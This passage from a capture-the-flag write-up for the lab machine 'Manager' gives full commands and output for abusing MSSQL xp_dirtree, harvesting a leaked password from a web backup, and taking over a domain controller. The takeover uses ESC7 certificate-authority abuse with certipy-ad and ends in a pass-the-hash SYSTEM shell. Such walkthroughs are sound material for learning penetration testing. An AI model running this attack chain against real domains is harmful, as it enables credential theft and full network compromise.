    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```

As can be seen above, we can try to enable xp_cmdshell. Let's try that:

```
enable_xp_cmdshell
```

#### Output:

```
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
```

Unfortunately, we do not have the privileges to enable xp_cmdshell. Let's instead try the next best approach and use xp_dirtree:

```
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\Users
```

#### Output:

```
subdirectory    depth   file   
-------------   -----   ----   
Administrator       1      0   

All Users           1      0   

Default             1      0   

Default User        1      0   

Public              1      0   

Raven               1      0   
```

We successfully list the Users directory on the MSSQL host machine. Snooping around reveals a website backup file in the wwwroot folder which looks promising:

```
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
```

#### Backup file:

```
website-backup-27-07-23-old.zip
```

Because this is in the webserver root directory, we can access (and download) this file from our attacker machine:

#### Downloading and unzipping website backup:

```
mkdir backup
cd backup
wget 10.129.116.131/website-backup-27-07-23-old.zip
unzip website-backup-27-07-23-old.zip
```

Long listing and revealing all files leads us to discover the file .old-conf.xml:

#### Listing contents:

```
ls -la
```

#### Output:

```
drwxr-xr-x  5 root         root            4096 Oct 25 10:13 .
drwx------ 23 candidbandit candidbandit    4096 Oct 25 10:13 ..
-rw-r--r--  1 root         root            5386 Jul 27  2023 about.html
-rw-r--r--  1 root         root            5317 Jul 27  2023 contact.html
drwxr-xr-x  2 root         root            4096 Oct 25 10:13 css
drwxr-xr-x  2 root         root            4096 Oct 25 10:13 images
-rw-r--r--  1 root         root           18203 Jul 27  2023 index.html
drwxr-xr-x  2 root         root            4096 Oct 25 10:13 js
-rw-r--r--  1 root         root             698 Jul 27  2023 .old-conf.xml
-rw-r--r--  1 root         root            7900 Jul 27  2023 service.html
-rw-r--r--  1 root         root         1045328 Jul 27  2023 website-backup-27-07-23-old.zip
```

Displaying the contents of this XML file leads to the disclosure of raven's password:

```
cat .old-conf.xml
```

#### Output:

```
 <user>raven@manager.htb</user>
 <password>R4v3nBe5tD3veloP3r!123</password>
```

This gives us access to WinRM:

```
evil-winrm -i 10.129.116.131 -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

Success, we have a shell on the DC:

```
*Evil-WinRM* PS C:\Users\Raven\Documents> 
```

## raven -> administrator

Running whoami /all reveals that we can access Certificate Services over DCOM, which supports our earlier observation of certificate services being used in our nmap scan:

```
*Evil-WinRM* PS C:\Users\Raven\Documents> whoami /all
```

#### Groups:

```
[...]
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
```

If we switch back over to our attacker machine, we can use certipy-ad to check for vulnerable certificate templates, as shown below:

```
certipy-ad find -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.116.131 -target dc01.manager.htb
```

Next, we will analyse the created text file for vulnerable templates:

```
head -n 35 20261025120052_Certipy.txt
```

#### Output:

```
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Raven
                                          MANAGER.HTB\Authenticated Users
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
```

We should take note of the following information:

1. ESC7 - An Active Directory Certificate Services attack.
2. The CA Name - manager-DC01-CA.
3. That Raven is in the ManageCertificates section.

ESC7 allows us to abuse the Certificate Authority and obtain a certificate that we would not normally be able to obtain. Raven has a special permission called ManageCA that allows them to make themselves a CA Officer. Enabling Raven to approve certificate requests to obtain an Administrator Certificate using a SubCA template, which facilitates requesting a certificate for anyone using a UPN.

The following steps showcase the exploitation of ESC7:

#### Add Raven as a CA Officer

```
certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -add-officer raven
```

Leveraging Raven's ManageCA rights, she elevates her permissions to become someone who can approve certificate requests.

#### Output:

```
[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

#### Enable the SubCA template:

```
certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -enable-template SubCA
```

Raven enables the SubCA template, that allows requesting certificates for any particular user using a UPN, rather than predefined users used in other templates.

#### Output:

```
[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

#### Request Administrator's certificate:

```
certipy-ad req -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -template SubCA -upn administrator@manager.htb
```



#### Output:

```
[*] Requesting certificate via RPC
[*] Request ID is 19
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '19.key'
[*] Wrote private key to '19.key'
[-] Failed to request certificate
```

This fails but we must take note of the Request ID, which is 19 in this case.

#### Override the rejection and Approve the Certificate Request:

```
certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -issue-request 19
```

#### Output:

```
[*] Successfully issued certificate request ID 19
```

#### Retrieve the issued certificate:

```
certipy-ad req -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -retrieve 19
```

#### Output:

```
[*] Retrieving certificate with ID 19
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '19.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### Authenticate using the certificate:

```
certipy-ad auth -dc-ip 10.129.116.131 -pfx administrator.pfx
```

#### Output:

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

This indicates a clock skew occured, so we can quickly clear that up with the following command:

```
ntpdate 10.129.116.131
```

And try again:

#### Authenticate using the certificate:

```
certipy-ad auth -dc-ip 10.129.116.131 -pfx administrator.pfx
```

#### Output:

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

#### Log in using NT hash:

```
impacket-psexec manager.htb/administrator@10.129.116.131 -hashes ae5064c2f62317332c88629e025924ef:ae5064c2f62317332c88629e025924ef
```

#### Output:

```
[*] Requesting shares on 10.129.116.131.....
[*] Found writable share ADMIN$
[*] Uploading file nQTtHZxu.exe
[*] Opening SVCManager on 10.129.116.131.....
[*] Creating service lrqD on 10.129.116.131.....
[*] Starting service lrqD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami 
nt authority\system
```

And that is the end of this machine!
